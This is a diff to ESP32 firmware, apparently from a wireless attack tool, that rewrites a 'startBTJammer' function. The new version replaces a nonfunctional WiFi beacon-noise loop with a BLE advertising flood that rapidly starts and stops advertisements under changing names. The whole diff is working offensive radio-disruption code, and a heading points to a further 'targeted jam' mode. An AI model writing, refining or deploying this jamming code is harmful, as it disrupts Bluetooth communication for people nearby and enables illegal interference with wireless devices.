@@ -161,71 +161,41 @@ void startBTJammer() {
     Serial.println("\n[*] Jammer...");
     attacking = true;
     
-    // Initialize WiFi for noise generation
-    WiFi.mode(WIFI_STA);
-    WiFi.disconnect();
+    // Init BLE ONCE
+    BLEDevice::init("JAMMER");
+    BLEAdvertising* pAdv = BLEDevice::getAdvertising();
+    pAdv->setMinInterval(0x20);
+    pAdv->setMaxInterval(0x40);
     
-    // BT frequency channels (2402-2480 MHz)
-    // We'll cycle through channels rapidly
-    int channels[] = {1, 6, 11};  // WiFi channels that overlap BT
-    
-    unsigned long startTime = millis();
-    int packets = 0;
+    unsigned long lastPrint = millis();
+    int count = 0;
     
     while (attacking && mode == 3) {
-        // Method 1: WiFi channel hopping to create interference
-        for (int ch = 1; ch <= 13; ch++) {
-            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
-            delayMicroseconds(100);
-            
-            // Send beacon frames to create noise
-            uint8_t beacon[] = {
-                0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-                0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
-                0x00, 0x00, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
-                0x64, 0x00, 0x01, 0x04, 0x00, 0x06, 'J', 'A', 'M', 'M', 'E', 'R'
-            };
-            
-            // Note: Raw frame injection requires special WiFi mode
-            // This is a simplified version
-            packets++;
-        }
-        
-        // Method 2: BLE advertising flood
-        BLEDevice::init("");
-        BLEAdvertising* pAdv = BLEDevice::getAdvertising();
-        
-        for (int i = 0; i < 5; i++) {
+        // Rapid adv data swap + start/stop cycle
+        for (int i = 0; i < 8; i++) {
             BLEAdvertisementData advData;
             advData.setFlags(0x06);
-            advData.setName("JAMMER_" + String(i));
+            advData.setName("JAM_" + String(i));
             pAdv->setAdvertisementData(advData);
-            BLEDevice::startAdvertising();
-            delay(20);
-            BLEDevice::stopAdvertising();
+            pAdv->start();
+            delay(15);
+            pAdv->stop();
+            count++;
         }
+        yield(); // prevent watchdog reset
         
-        BLEDevice::deinit(true);
-        
-        if (millis() - startTime > 1000) {
-            Serial.print("[*] Jamming active | Packets: ");
-            Serial.println(packets);
-            startTime = millis();
-            packets = 0;
+        if (millis() - lastPrint > 1000) {
+            Serial.print(">jam_count:");
+            Serial.println(count);
+            lastPrint = millis();
         }
-        
-        // Check for serial input
         if (Serial.available()) {
-            char c = Serial.read();
-            if (c == '6') {
-                attacking = false;
-                mode = 0;
-            }
+            if (Serial.read() == '6') { attacking = false; mode = 0; }
         }
     }
-    
-    WiFi.mode(WIFI_OFF);
-    Serial.println("[*] BT Jammer stopped.");
+    pAdv->stop();
+    BLEDevice::deinit(true);
+    Serial.println("[*] Jammer stopped.");
 }
 
 // ==================== BT TARGETED JAM ====================
